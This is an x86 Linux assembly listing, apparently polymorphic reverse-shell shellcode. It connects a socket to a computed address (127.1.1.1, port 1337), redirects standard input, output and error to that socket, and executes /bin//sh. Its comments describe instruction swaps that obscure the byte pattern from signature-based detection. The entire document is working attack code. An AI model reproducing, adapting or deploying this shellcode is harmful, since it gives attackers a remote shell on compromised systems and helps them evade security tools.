 
global _start			

section .text
_start:
	xor ebx, ebx		;zero out EBX
	mul ebx			;zero out EAX, EDX
	mov al,0x66
	inc ebx			;EBX = 1
	push edx		;push 0
	push ebx		;push 1
	push 0x2		;push 2
	mov ecx,esp
	int 0x80

	xchg edx, eax
	add eax, 0x66		;since socket() is succusful, EAX=0, so just 
				;add 0x66 instead of moving
	mov esi, 0xffffffff	;trick to compute the ip address 
	sub esi, 0x80fefefe	;instead of directly pushing it
	bswap esi
	push esi
	push word 0x3905 	;leave this unchanged
	add ebx,1		;add instead of inc
	push bx
	mov ecx, esp
	
	rol ebx, 0x3		;ebx is 2, left rotate by 3, is
				;equivallent to mult by 8 (2*2*2)
				;so it will get to 0x10
	push ebx
	sub ebx, 0xd		;subtract from 0x10, to get 0x3
	
	push ecx
	push edx
	mov ecx, esp
	int 0x80
	

	xor ecx, ecx
	add ecx, 0x2
	mov ebx, edx	
loop:
	mov al,0x40
	dec al
	int 0x80
	dec ecx
	jns loop

        mov al, 0x9
	add al, 0x2
	inc ecx
	mov edx,ecx
	push edx
	push 0x68732f2f
	rol esi, 2
	inc edi
	push 0x6e69622f
	mov ebx,esp
	int 0x80

